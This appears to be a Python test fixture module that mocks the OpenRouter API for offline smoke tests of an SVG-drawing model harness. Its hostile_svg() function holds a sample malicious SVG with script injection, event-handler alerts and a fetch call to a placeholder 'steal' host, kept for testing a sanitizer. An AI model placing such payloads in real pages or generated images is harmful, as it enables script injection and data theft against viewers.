# SPDX-License-Identifier: MIT
# Copyright (c) 2026 Claudio Drews
"""Offline stand-in for the OpenRouter API, for smoke tests. NO network, NO key, NO cost.

`MockTransport(script)` is a drop-in `transport(key, body)`: each call returns the next scripted response
(a dict with `content` and/or `tool_calls`, and optional `cost`; `nocost: True` omits usage.cost). `harness_script()` is a short, benign
three-turn conversation for scripts/run_models_v6.py: run_python writes an SVG, render_svg renders it, then the
final answer. `hostile_svg()` is an SVG with the attacks the validator and sanitizer must neutralize.
"""
import json


def hostile_svg():
    return ('<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" '
            'viewBox="0 0 1000 1000" width="1000" height="1000" onload="alert(1)">'
            '<script>fetch("https://example.invalid/steal")</script>'
            '<rect width="1000" height="1000" fill="#fff"/>'
            '<use href="https://example.invalid/x.svg#a"/>'
            '<image href="https://example.invalid/pixel.png" width="10" height="10"/>'
            '<foreignObject width="10" height="10"><div xmlns="http://www.w3.org/1999/xhtml">x</div></foreignObject>'
            '<circle cx="500" cy="500" r="300" fill="url(https://example.invalid/g)" style="stroke:url(http://x/y);stroke-width:8" '
            'onclick="alert(2)"/>'
            '<animate attributeName="r" from="1" to="9" dur="1s"/>'
            '<path d="M200 700 Q500 900 800 700" stroke="#000" stroke-width="14" fill="none"/>'
            '</svg>')


def benign_svg():
    return ('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1000 1000" width="1000" height="1000">'
            '<rect width="1000" height="1000" fill="#f7f3e8"/>'
            '<ellipse cx="500" cy="450" rx="220" ry="300" fill="none" stroke="#111" stroke-width="14"/>'
            '<circle cx="420" cy="400" r="22" fill="#111"/><circle cx="580" cy="400" r="22" fill="#111"/>'
            '<path d="M380 600 Q500 700 620 600" fill="none" stroke="#111" stroke-width="14" stroke-linecap="round"/>'
            '<path d="M330 250 Q500 120 670 250 L670 300 Q500 220 330 300 Z" fill="#111"/>'
            '</svg>')


class MockTransport:
    def __init__(self, script, usage=(1200, 400)):
        self.script, self.i, self.usage, self.bodies = list(script), 0, usage, []

    def __call__(self, key, body):
        self.bodies.append(json.loads(json.dumps(body)))
        step = self.script[min(self.i, len(self.script) - 1)]
        self.i += 1
        if step.get("error"):
            raise RuntimeError(step["error"])
        msg = {"role": "assistant", "content": step.get("content"), "tool_calls": step.get("tool_calls")}
        usage = {"prompt_tokens": self.usage[0], "completion_tokens": self.usage[1],
                 "completion_tokens_details": {"reasoning_tokens": 0}}
        if not step.get("nocost"):          # nocost: the provider omits usage.cost
            usage["cost"] = step.get("cost", 0.0005)
        return {"choices": [{"message": msg, "finish_reason": "tool_calls" if step.get("tool_calls") else "stop"}],
                "usage": usage, "provider": "mock"}


def tool_call(i, name, **args):
    return {"id": f"call_{i}", "type": "function", "function": {"name": name, "arguments": json.dumps(args)}}


def final_answer(svg):
    return {"content": f"EVENT: a mock event\nTITLE: Mock Title\n\n```xml\n{svg}\n```"}


def harness_script(svg=None):
    svg = svg or benign_svg()
    code = "open('face.svg','w').write(" + json.dumps(svg) + ")\nprint('written')"
    return [{"tool_calls": [tool_call(1, "run_python", code=code)]},
            {"tool_calls": [tool_call(2, "render_svg", path="face.svg")]},
            final_answer(svg)]


def oneshot_script(svg=None):
    return [final_answer(svg or benign_svg())]
